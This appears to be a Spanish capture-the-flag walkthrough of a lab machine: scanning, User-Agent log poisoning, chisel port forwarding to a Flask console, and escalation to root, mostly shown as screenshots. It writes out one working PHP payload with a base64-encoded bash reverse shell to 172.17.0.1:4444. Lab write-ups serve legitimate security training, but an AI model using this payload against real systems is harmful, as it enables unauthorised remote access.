1- Ping y NMAP

<img width="626" height="209" alt="image" src="https://github.com/user-attachments/assets/e220a31a-dc70-4c6a-a240-ca4390679a2d" />

2- Gobuster para ver directorios:

<img width="753" height="471" alt="image" src="https://github.com/user-attachments/assets/f1b100d0-f240-4601-ae4f-7e9d57574373" />

3- Capturo una peticion con burpsuite:

<img width="592" height="227" alt="image" src="https://github.com/user-attachments/assets/983f78a4-4215-4c06-b4f0-c4d1b919f5a5" />

Y veo que envia los errores en un fichero debug.log, ahora en el campo de user agent copiaremos esto:

<?php echo `printf YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0NDQgMD4mMQo= |base64 -d | bash`;?> ES LO MISMO QUE UNA SHELL REVERSA, ESCUCHA POR EL PUERTO 4444.netcat

<img width="763" height="388" alt="image" src="https://github.com/user-attachments/assets/b124509c-28b2-41c2-a58e-efd1e68bdf34" />

vemos el debug.log

<img width="211" height="88" alt="image" src="https://github.com/user-attachments/assets/d42b2b4d-72cd-4424-a385-d884a23cc588" />

<img width="634" height="18" alt="image" src="https://github.com/user-attachments/assets/ce27e9d7-601f-4232-a303-10799c3be8ba" />

lo enviamos y vamos a la pagina 

<img width="268" height="30" alt="image" src="https://github.com/user-attachments/assets/422b065c-0c74-4a7a-9371-eb9ae4f9cd60" />

Y automaticamente nos llega la shell

<img width="644" height="207" alt="image" src="https://github.com/user-attachments/assets/84216f91-5584-41c1-9ea5-694c7be2135f" />

Vemos que tiene algo en escucha en el puerto 5000, lo busco y es flask que corre con python creo.

Voy a lanzar un server para copiarme chisel a la maquina victima:

<img width="406" height="77" alt="image" src="https://github.com/user-attachments/assets/657ec9a9-40f7-42b7-a5db-f49fd21913a3" />

<img width="451" height="75" alt="image" src="https://github.com/user-attachments/assets/b0ad5902-65dd-45a6-b6d6-d18616cda4c6" />

Una vez copiado, nos ponemos en escucha con chisel en nuestra maquina:

<img width="725" height="102" alt="image" src="https://github.com/user-attachments/assets/5c1ef376-5f0f-4d1d-aa7e-ebbc78518b8f" />

<img width="309" height="21" alt="image" src="https://github.com/user-attachments/assets/88947e6f-2241-4a2d-b33d-c9f8c4d84e83" />

Damos permisos en la maquina victima y ejecutamos chisel:

<img width="591" height="66" alt="image" src="https://github.com/user-attachments/assets/342bfae9-6285-425c-bcc5-c30dd7ae3ecf" />

Ya tenemos el port fortwarding, vamos a ver que corre en ese puerto 5000 via http

<img width="1021" height="272" alt="image" src="https://github.com/user-attachments/assets/6f414f6d-ea04-419b-a97e-0316968aee97" />

Buscamos a ver si hay algun directorio oculto:

<img width="778" height="312" alt="image" src="https://github.com/user-attachments/assets/02b692c1-a0eb-443d-84b4-9dd840cef313" />

Vemos que hay /console, entramos y nos tiramos otra shell.

<img width="220" height="71" alt="image" src="https://github.com/user-attachments/assets/c30f4183-d1ae-46b3-b2fe-cc3895d37850" />

<img width="584" height="250" alt="image" src="https://github.com/user-attachments/assets/04b0d10e-8f69-456c-a93d-6989eed7d272" />

Ya nos llega la shell:

<img width="622" height="216" alt="image" src="https://github.com/user-attachments/assets/0abebbf9-16a8-4d06-b67e-b2fd87c9f763" />

VEmos que tenemos permisos para ejecutar comandos y creamos otra shell para cambiar de usuario:

<img width="270" height="40" alt="image" src="https://github.com/user-attachments/assets/64ab0765-c831-4995-abf0-35b99de38bc0" />

Nos ponemos en escucha 

Damos permisos y ejecutamos

<img width="654" height="49" alt="image" src="https://github.com/user-attachments/assets/1a67880d-c5f6-443c-91c1-d058df857db5" />

Una vez dentro miramos permisos:

<img width="756" height="147" alt="image" src="https://github.com/user-attachments/assets/f9d120b9-3448-4439-8de8-fe74529d50b5" />

Aqui me he perdido un poco y he tenido que buscar porque no entiendo que se hace pero por lo visto hay alguna vulnerabilidad en ese codigo y introduciendo esto :

<img width="687" height="126" alt="image" src="https://github.com/user-attachments/assets/c4204cbe-3a33-4bd7-be00-135911b27257" />

ya somos root.
